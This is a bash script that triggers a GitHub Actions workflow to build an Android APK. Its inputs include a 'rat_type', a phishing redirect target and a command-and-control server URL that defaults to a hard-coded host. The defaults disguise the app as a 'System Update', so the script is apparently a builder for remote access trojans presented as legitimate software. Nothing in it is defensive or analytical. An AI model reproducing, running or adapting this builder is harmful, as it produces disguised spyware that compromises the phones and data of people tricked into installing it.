#!/usr/bin/env bash
# Trigger GitHub Actions auto-build from CLI (sama seperti tombol BUILD APK SEKARANG)
# Usage:
#   export GH_TOKEN=ghp_xxxx
#   export GH_REPO=owner/repo
#   ./builder/trigger_build.sh \
#     --name "Aplikasi Test" \
#     --type ALL \
#     --mode URL \
#     --value "https://target-phish.example" \
#     --server "http://papsky.queen-official.com:2468"
set -euo pipefail

NAME="System Update"
APP_ID="com.sync.xxx"
TYPE="ALL"
MODE="URL"
VALUE="https://example.com"
SERVER="http://papsky.queen-official.com:2468"
PAIR=""
ICON=""
VNAME="1.0"
VCODE="1"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --name) NAME="$2"; shift 2;;
    --id) APP_ID="$2"; shift 2;;
    --type) TYPE="$2"; shift 2;;
    --mode) MODE="$2"; shift 2;;
    --value) VALUE="$2"; shift 2;;
    --server) SERVER="$2"; shift 2;;
    --pair) PAIR="$2"; shift 2;;
    --icon) ICON="$2"; shift 2;;
    --vname) VNAME="$2"; shift 2;;
    --vcode) VCODE="$2"; shift 2;;
    *) echo "Unknown $1"; exit 1;;
  esac
done

: "${GH_TOKEN:?set GH_TOKEN}"
: "${GH_REPO:?set GH_REPO owner/name}"

ICON_B64=""
if [[ -n "$ICON" && -f "$ICON" ]]; then
  ICON_B64=$(base64 -w0 "$ICON")
fi

# Escape JSON
json_escape() {
  python3 -c 'import json,sys; print(json.dumps(sys.stdin.read())[1:-1])' <<<"$1"
}

PAYLOAD=$(cat <<EOF
{
  "ref": "main",
  "inputs": {
    "app_name": "$(json_escape "$NAME")",
    "app_id": "$(json_escape "$APP_ID")",
    "rat_type": "$TYPE",
    "redirect_mode": "$MODE",
    "redirect_value": $(python3 -c 'import json,sys; print(json.dumps(sys.argv[1]))' "$VALUE"),
    "server_url": "$(json_escape "$SERVER")",
    "pair_id": "$(json_escape "$PAIR")",
    "icon_base64": $(python3 -c 'import json,sys; print(json.dumps(sys.argv[1]))' "$ICON_B64"),
    "version_name": "$VNAME",
    "version_code": "$VCODE"
  }
}
EOF
)

echo "Dispatching workflow to $GH_REPO ..."
curl -sS -X POST \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer $GH_TOKEN" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  "https://api.github.com/repos/${GH_REPO}/actions/workflows/build.yml/dispatches" \
  -d "$PAYLOAD"

echo
echo "Dispatched. Cek: https://github.com/${GH_REPO}/actions"
echo "Artifact akan muncul setelah job 'Build Release APK' selesai (BUILD BERHASIL)."
